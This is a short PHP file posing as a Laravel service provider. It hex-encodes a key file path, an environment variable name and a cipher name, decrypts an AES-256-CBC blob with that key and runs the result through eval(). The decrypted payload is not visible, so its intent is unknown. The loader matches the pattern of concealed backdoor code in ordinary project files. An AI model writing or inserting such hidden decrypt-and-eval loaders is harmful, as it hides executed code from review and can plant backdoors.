<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('J95h6XAzlDcfXmWvJHhjWw==');

$c=base64_decode(

'CYDCW/cjv8D+e6ig2phnvoo1PJpxPeMBWx4w6K0l7KMwDEvoG9mHi2+gQ1Yho0C2IwL/XkqqClc4' .
'RkpTEy4IcViDET1wsBSHjHENqtAj9ava+mWLbHjW/eHBpwaHr1FiMBXEQWHaRXmt3QVxyqw5AMGF' .
'PprUHaGCMGIa4Ah1p68JaoSgxYlByd5dlT1TJHEsY533RWYTN2XXbNOze0deFCwE42BHD0RSIKYc' .
'VIzma3fsS2RdxVGRYM2D1zqD1byVOJf0jjTQaKQJxXpmwhmgjhMU6zmDxG/827svIn0f54EmJqp6' .
'VKrYFiiovo0OZeU3/6a2mXmdlQXBhLIxYyjDOilBTYBOBrf8mH+oZ4m7DJdWeuxkD2ktnDFHlzk+' .
'ajoEt1y8tqRIMnBt/DXMviMr+A3mXLJXWRs8r3hcxNum64EGRvNc0bj+OORxzHwrHODb23hWBKoa' .
'H1w1KUPd1qIw6XtqsgvnFNX6LmVuuuKUum/U4u+wPvyH9KzlkO3xm+tViygzwp59dHKW5d+Vwd7u' .
'skoOF2JIkjLar9Pb/hvHpcnm+aVZjugqAb070RMuHaz08p+MvpHDO6TmJAMQheYLJq+ZSmLuchG2' .
'YCyivtZQDq9Po62czzS1Tkbj3YnRAfEIeHBRDwl0yvadtuLD0WF/RCLsmJ5z1Oh0Zminfq1hXzhA' .
'QTbgHiGz3BU30jFN2LnbIx86G/RYf6AKFimedYbGJS/u+X9I8Lx9dkK6rTgbduyaE3fur35Gy6Yd' .
'OKP9i66sEZxGmgdHd5PNNg2z7UPgFE9Jau+VtUiT+hMk9660MuaiHpDCm1dJ5Od7Is//LBL5yes3' .
'sRI6CEMlYhCLP8/n+srq51vmJhjBMSnE7gGk262nb8O9jMGgLFuZY/UBZ1S8TlSFVejmGXUW25zw' .
'oeQK3FmUYMwsa9OJwXGGbB1mPRQ6lfIN2brRsVdLI1d7tqUg'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

